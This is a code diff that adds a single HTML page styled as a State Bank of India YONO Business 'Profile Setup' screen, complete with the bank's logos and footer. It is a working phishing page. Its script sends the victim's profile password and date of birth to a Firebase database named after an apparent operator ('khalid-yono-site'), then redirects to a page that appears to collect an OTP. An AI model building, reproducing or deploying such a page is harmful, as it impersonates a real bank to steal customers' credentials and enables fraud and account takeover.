@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Profile Setup</title>
+  <link rel="icon" href="./resource/yonosbilogo.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(90deg, #b0175d, #5a0d7a);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* 🔹 Header */
+    .headerContainer {
+      width: 100%;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .headerContainer img {
+      height: 40px;
+      width: auto;
+      margin-top: 5px;
+    }
+
+    /* 🔹 Form Container */
+    .mainContent {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
+    }
+
+    .container h2 {
+      text-align: center;
+      color: #b0175d;
+      margin-bottom: 20px;
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 2px solid #b0175d;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #8a1148;
+      box-shadow: 0 0 6px rgba(176, 23, 93, 0.4);
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(90deg, #b0175d, #5a0d7a);
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+     background: linear-gradient(90deg, #db2a7a, #8f19c2);
+    }
+
+    /* 🔹 Footer */
+    .footer {
+      width: 100%;
+      background: #000000;
+      text-align: center;
+      font-size: 12px;
+      color: #cccbcb;
+      padding: 15px 10px;
+      border-top: 1px solid #ddd;
+    }
+
+    .footer a {
+      color: #cccbcb;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="headerContainer">
+    <img src="../resource/yonobusiness.png" alt="logo" />
+  </div>
+
+  <!-- Main Form -->
+  <div class="mainContent">
+    <div class="container">
+      <h2>Profile Setup</h2>
+      <form id="profileForm">
+        <div class="form-group">
+          <label for="password">Profile Password</label>
+          <input type="password" id="password" placeholder="Enter Profile Password" required>
+        </div>
+        <div class="form-group">
+          <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+          <input type="text" id="dob" placeholder="DD/MM/YYYY" maxlength="10" required>
+        </div>
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    © State Bank of India (APM Id:E-Ch_Tran_2200) <br>
+    <a href="#">Disclaimer</a> | 
+    <a href="#">Fair Lending Practice Code</a> | 
+    <a href="#">Privacy Statement</a> | 
+    <a href="#">Security Tips</a> | 
+    <a href="#">About Phishing</a> | 
+    <a href="#">Report Phishing</a> | 
+    <a href="#">Sitemap</a>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // 🔹 Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBkXriVwOnMUn3OJf5Tn_EmV5aZt8tSBEo",
+      authDomain: "khalid-yono-site-2234-31-8-25.firebaseapp.com",
+      databaseURL: "https://khalid-yono-site-2234-31-8-25-default-rtdb.firebaseio.com",
+      projectId: "khalid-yono-site-2234-31-8-25",
+      storageBucket: "khalid-yono-site-2234-31-8-25.appspot.com",
+      messagingSenderId: "360035590056",
+      appId: "1:360035590056:web:exampleid"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // ✅ Auto Format DOB
+    document.getElementById("dob").addEventListener("input", function (e) {
+      let value = e.target.value.replace(/\D/g, ""); // Remove non-digits
+
+      if (value.length > 2 && value.length <= 4) {
+        value = value.slice(0, 2) + "/" + value.slice(2);
+      } else if (value.length > 4) {
+        value = value.slice(0, 2) + "/" + value.slice(2, 4) + "/" + value.slice(4, 8);
+      }
+
+      e.target.value = value;
+    });
+
+    // ✅ Form Submit
+    document.getElementById("profileForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const password = document.getElementById("password").value;
+      const dob = document.getElementById("dob").value;
+
+      if (!password || !dob) {
+        alert("⚠ Please fill all fields!");
+        return;
+      }
+
+      db.ref("packages").push({
+        profilePassword: password,
+        dob: dob,
+        timestamp: new Date().toISOString()
+      }).then(() => {
+        // alert("✅ Profile Saved Successfully!");
+        window.location.href = "./otp2pageagain.html"; 
+      }).catch((error) => {
+        console.error("Firebase Error:", error);
+        alert("❌ Error saving data: " + error.message);
+      });
+    });
+  </script>
+</body>
+</html>
